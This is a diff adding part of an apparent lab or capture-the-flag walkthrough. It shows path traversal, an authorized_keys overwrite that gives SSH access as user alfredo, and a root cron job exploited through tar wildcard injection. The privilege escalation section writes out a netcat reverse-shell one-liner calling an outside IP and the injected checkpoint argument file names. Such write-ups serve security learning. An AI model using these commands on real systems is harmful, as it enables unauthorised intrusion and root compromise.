@@ -154,3 +154,77 @@ cool we got some dir, let's check em out
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e23f7a96-9e97-4446-b606-79e9ac9b835d)
 
 checking out the help dir, we got to see some interesting things 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1f92db45-c870-4f85-a126-ef1a091ee59a)
+
+cool we got a path traversal vuln, let's look around to see what we can get.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/20465dd5-ac94-4ada-be82-1a1c1486b08e)
+
+we got to see an home for user `alfredo`, remember we got an upload function, why don't we try overwrite the `authorized_keys` in the .ssh dir of user `alfredo`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b01184b7-bcb9-43ec-ab1a-76291e905099)
+
+let's upload an `authorized_keys` to the .ssh dir. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/688fc242-eca5-4693-9db5-065051723e0c)
+
+cool we uploaded it, let's confirm if we uploaded it successfully.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e177c92c-7e7f-4162-8e73-fd2891d3c8bb)
+
+Cool we uploaded it successfully. let's ssh into the target. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ec4a4044-5960-4be1-b826-5a04fb74e8b9)
+
+Bankai!!! we are in.
+
+
+## Privilege Escalation
+
+```
+[alfredo@fedora ~]$ cat /etc/crontab 
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *
+
+[alfredo@fedora ~]$ 
+```
+checking the crontab, we can see a cronjob running every 1min, checking the cronjob we can see it is running a backup, using tar. we can exploit the tar bin using tar wildcard injection.
+
+```
+[alfredo@fedora ~]$ cd restapi/
+[alfredo@fedora restapi]$ nano shell.sh
+[alfredo@fedora restapi]$ cat shell.sh 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.241 21 >/tmp/f
+[alfredo@fedora restapi]$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+[alfredo@fedora restapi]$ echo "" > --checkpoint=1
+[alfredo@fedora restapi]$ 
+```
+steps on how to exploit wildcard injection. when the cronjob will execute the next minute, it will take those files as arguments/flags rather than a normal file name and send a reverse shell to us.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eb7b62a1-4f32-4b9d-b894-1eb2312c091f)
+
+cool we got root after waiting for 1 miniute. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/44c5fd4c-571e-44c0-8667-9c5d777b1b19)
+
+and we are through 😜 interesting yeah ?
